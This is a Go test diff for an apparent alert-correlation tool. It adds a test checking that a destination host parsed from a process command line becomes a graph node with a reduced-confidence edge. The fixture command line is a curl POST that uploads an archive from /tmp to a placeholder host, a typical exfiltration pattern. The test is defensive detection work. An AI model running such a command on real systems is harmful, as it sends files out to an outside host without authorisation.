@@ -183,3 +183,28 @@ func TestBurstItemsAndBeacon(t *testing.T) {
 		t.Errorf("beacon candidate not flagged: %+v", beacon)
 	}
 }
+
+func TestGraphCmdlineDestination(t *testing.T) {
+	evSeq = 0
+	f := &fakeGraphSrc{alerts: map[string][]int64{}, briefs: map[int64]store.AlertBrief{}}
+	st := startEv("{PS}", "{CMD}", "curl", -time.Minute)
+	st.CommandLine = sp("curl -s -X POST -F file=@/tmp/x.tgz http://example.com/upload")
+	f.evs = []store.Event{startEv("{CMD}", "{WININIT}", "bash", -time.Hour), st}
+	g, err := BuildAlertGraph(context.Background(), f, chainInput())
+	if err != nil {
+		t.Fatal(err)
+	}
+	n := nodeByLabel(g, "example.com")
+	if n == nil || n.Meta["source"] == "" {
+		t.Fatalf("command-line destination missing: %+v", n)
+	}
+	var found bool
+	for _, e := range g.Edges {
+		if e.Target == n.ID && e.Evidence == "cmdline" && e.Confidence < 100 {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("edge must be marked cmdline with reduced confidence")
+	}
+}
